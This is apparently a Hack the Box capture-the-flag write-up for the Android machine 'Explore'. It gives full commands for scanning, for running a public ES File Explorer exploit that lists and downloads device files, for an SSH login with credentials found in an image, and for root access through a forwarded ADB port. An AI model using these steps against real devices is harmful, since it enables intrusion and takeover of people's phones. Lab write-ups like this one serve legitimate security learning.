---
title: Explore - Hack the Box Write-Up
published: true
---
**Difficulty**: Easy. **OS**: Android.

Explore is a recently retired machine from Hack the Box. Intrusion was quite simple but privilege escalation has some interesting things for keep in the arsenal.

Let's go.

### Intrusion

We start as always with recognition and enumeration phase with nmap. The victim's IP address is 10.10.10.247.

```
nmap -p- --min-rate=5000 -Pn -v -oN allPorts 10.10.10.247
```
![](./media/explore/recon.png)
Ports 2222, 42135, 46103, 59777 were found open. Let's check what's going on in these ports.

```
sudo nmap -p2222,42135,46103,59777 -sC -sV 10.10.10.247 -oN targeted
```
![](./media/explore/enum1.png)
![](./media/explore/enum2.png)

On port 42135 is running an ES File Explorer server which is a file manager for Android devices. A exploit for this service was found on exploit-db. This exploit is written in Python.

![](./media/explore/exploit.png)

This exploit tramitates http requests to the ES File Explorer server to list or download files. The usage of the exploit is:

```
python3 50070.py <command> <IP-address> [file to download]
```

Doing some exploration in the files of the device I found some interesting thing on pictures folder:

```
python3 50070.py listPics 10.10.10.247
```
![](./media/explore/listpics.png)

I've downloaded this picture to my local machine, it has some credentials on it.
```
python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
```
![](./media/explore/credentials.png)

These credentials were useful to login via SSH to the victim's machine.

![](./media/explore/ssh.png)

Ok, intrusion done, we see user's flag.

![](./media/explore/user-flag.png)


### Privilege Escalation

Once inside the machine a daemon was found in listen on port 5555 executed by "shell" user. This port was found filtered in the nmap scanning, so this daemon must be on listen on localhost. The shell UID is reserved for development and testing apps.
```
netstat -ape
```

![](./media/explore/nepstat.png)

Doing a little research in duckduckgo I found that port 5555 is usually related to Android Debug Bridge (ADB), a service that allows connections to Android devices to install packages and evaluate changes ([https://source.android.com/setup/build/adb](https://source.android.com/setup/build/adb)). 

In fact, the binary of ADB (adbd) is running by "shell" user.
```
ps -A | grep "adbd"
```
![](./media/explore/ps.png)

To gain access to this service I've done 2 things.

*  Install adb client on my local machine.

```
sudo apt-get install adb
```

*  Tunnelize the connection via SSH. By doing this the port 5555 of the Android device will be forwarded to the port 5555 of my local machine.

```
ssh kristi@10.10.10.247 -p 2222 -L 5555:127.0.0.1:5555
```

Once the connection via SSH was done, some configuration to adb client was needed (This configuration was done in my local machine). First, the port of connection was configured to port 5555.

```
adb tcpip 5555
```

Then the connection was established to ADB service.

```
adb connect 127.0.0.1:5555
```

ADB client allows to restart the adbd daemon with root permissions.

```
adb -s 127.0.0.1:5555 root
```

At this point the daemon is running with root privileges. This was checked on the SSH session.

```
netstat -ape
```
![](./media/explore/daemon-root.png)

At this point a shell with root privileges was obtained with adb client (On the local machine).

```
adb -s 127.0.0.1:5555 shell
```
![](./media/explore/rooted.png)

Now we see the root flag.

![](./media/explore/root-flag.png)

Machine owned!

### Conclusion

Although the machine was quite easy, I've learned some things that will keep in the arsenal when I have to deal again with a Android device, specially the privilege escalation stage, Android directories and dealing with processes and connections.
